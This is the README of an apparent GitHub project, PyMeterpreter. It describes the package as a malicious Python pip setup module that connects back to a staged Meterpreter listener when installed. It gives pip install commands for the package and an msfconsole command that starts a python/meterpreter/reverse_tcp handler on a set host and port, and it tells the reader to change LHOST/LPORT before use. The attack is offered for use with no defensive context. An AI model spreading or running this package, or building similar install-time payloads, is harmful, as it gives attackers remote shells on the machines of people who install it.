# PyMeterpreter

This is a malicious Python PIP setup module which connects back to a staged Meterpreter listener.

You'll probably want to clone the repo, and then change your LHOST/LPORT before using ;-)

## Usage

There are a couple of ways to install/run the code from the shell:

### Direct from Git repo:
`pip install git+https://github.com/ben0/PyMeterpreter`

### Clone the Git repo:
`git clone https://github.com/ben0/PyMeterpreter`\
`pip install ./PyMeterpreter --upgrade`

### Fire up MSF
`msfconsole -x "use exploit/multi/handler; set payload python/meterpreter/reverse_tcp; set LHOST 172.16.10.10; set LPORT 443; exploit -j"`
